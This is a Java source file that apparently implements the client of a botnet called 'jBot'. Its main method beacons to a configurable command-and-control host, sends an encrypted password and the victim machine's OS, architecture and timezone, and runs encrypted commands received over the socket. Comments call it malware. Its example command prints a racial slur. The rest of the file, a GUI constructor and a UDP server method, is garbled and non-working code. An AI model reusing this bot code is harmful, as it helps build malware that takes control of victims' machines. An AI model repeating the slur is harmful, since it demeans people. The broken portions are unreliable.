package Server;

import java.awt.BorderLayout;

import java.awt.Button;
import java.awt.Component;
import java.awt.MenuItem;
import java.awt.Panel;
import java.awt.PopupMenu;
import java.awt.TextArea;
import java.awt.TextComponent;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.print.Book;
import java.io.*;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.Arrays;
import java.util.EventObject;
import java.util.Locale;
import java.util.TimeZone;
import javax.accessibility.Accessible;
import javax.swing.Box;
import FRAT_Experimential.*;


public class Main implements ActionListener {  // lets make this as minimal as possible. No dependencies, Just as small as possible.

public Main() {
	super();
	Button startButton = new Button("Start Server");
	Button stopButton = new Button("Stop Server");
	Serializable clientButton = new Button("Start/Stop Client");
	TextComponent logArea = new TextArea(10, 40);
	logArea.setFocusable(false);
	Panel buttonPanel = new Panel();
    buttonPanel.add(startButton);
	buttonPanel.add(stopButton);
	Component uttonPanel = null;
	uttonPanel.add((PopupMenu) clientButton);
	add(BorderLayout.NORTH, buttonPanel);
	
	startButton.addActionListener((ActionListener) this);
	stopButton.addActionListener((ActionListener) this);
	((MenuItem) clientButton).addActionListener(this);
	setSize(400, 300);
    setVisible(true);
}

	
    private void setVisible(boolean b) {
	// TODO Auto-generated method stub
	
}


	private void setSize(int i, int j) {
	// TODO Auto-generated method stub
	
}


	private void add(String north, Panel buttonPanel) {
	// TODO Auto-generated method stub
	
}


	private static final String host = "localhost"; // change to your cnc host
    private static final int    bot_port = 512; //change to your bot port

    private static volatile boolean killSession = false;
	private static Object event;

    private static final String
            encryptionKey = ".jBotEncryptionKey",
            password = ".A4r0nAkht4r";
	protected static final String Aes = null;

    private static Thread handleCommand(String c){
        final String comman = c.trim();
        return new Thread(){
            @Override
            public void run() {
                try {
                    String f;
                    if ((f = Client.decrypt(comman.trim(), encryptionKey)) != null) {
                        final String[] commandArgs = f.split(".hell");
                        // WE ARE USING SWITCH OVER REFLECTIONS AS I WANT THE MALWARE TO BE AS LIGHTWEIGHT AS POSSSSSIBLE.
                        switch (commandArgs[0].toLowerCase(Locale.ROOT)){

                            // DO NOT REMOVE THIS COMMAND!
                            case ".kill":{
                                killSession = true;
                                break;
                            }


                            // example command
                            case "random":{

                                System.out.println();
                                System.out.println("nigger");
                                System.out.println(Arrays.toString(commandArgs));
                                break;
                            }

                        }
                    }
                }catch (Exception e){
                    e.printStackTrace();
                }
            }
        };
    }

    private static boolean listen(BufferedReader reader) throws Exception {
        String command;
        if ((command = reader.readLine()) != null) {
            try {
                handleCommand(command).start();
            }catch (Exception e) {}
        }else{
            return false;
        }
        return true;
    }
    
    public static void main1(String[] args) throws Exception {
        HttpServer server =  HttpServer();
        int startButton;
        String startButton1 = ".fu";
//        server.HttpServer(46463);
        try (DatagramSocket serverSocket1 = new DatagramSocket(48833)) {
            byte[] receiveData = new byte[1399999999];
            byte[] sendData = new byte[1399999999];
            while (true) {
                DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);
                serverSocket1.receive(receivePacket);
                String input = new String(receivePacket.getData());
                InetAddress ipAddress = receivePacket.getAddress();
                int port = receivePacket.getPort();               
            {   
            
            	Object stopButton = null;
            	Object clientButton = null;

            	if (event.equals(stopButton)) {
            	    PrintStream logArea = null;
            	    String startButton11 = ".nj";
					boolean isSending = true;
					DatagramSocket serverSocket = null;
					serverSocket.close();
					logArea.append("Server stopped\n");
            	} else if (((EventObject) event).getSource() == clientButton) {
            	    Object clientSocket = null;
            	    if (clientSocket == null) {
            	        try {
            	            // code here
            	        } catch (Exception e) {
            	            // handle exception
            	        }
            	    }
            	    
            	    
            	}
            }
            


                         }
            
                   }
    }
  
    private static HttpServer HttpServer() {
		// TODO Auto-generated method stub
		return null;
	}

	public static void main(String[] args) {


        while(true){
            try {
                try(Socket socket = new Socket(host, bot_port);
                    BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()))){
                    //os#arch#timezone
                    writer.write(Client.encrypt(password, encryptionKey) + "\n");
                    writer.write(Client.encrypt(System.getProperty("os.name") + "#"+System.getProperty("os.arch")+"#" + TimeZone.getDefault().getID(), encryptionKey) + "\n");
                    writer.flush();
                    socket.setSoTimeout(5000);
                    while(!killSession) {
                        try {
                            if (!listen(reader)) break;
                        } catch (Exception e) {
                            if (e instanceof SocketTimeoutException) continue;
                            break;
                        }
                    }
                    if (killSession) killSession = false;
                }
                Thread.sleep(10000); // waits 10 seconds after being killed

            }catch (Exception e){

            }


        }

    }


	@Override
	public void actionPerformed(ActionEvent arg0) {
		// TODO Auto-generated method stub
		
	}

}
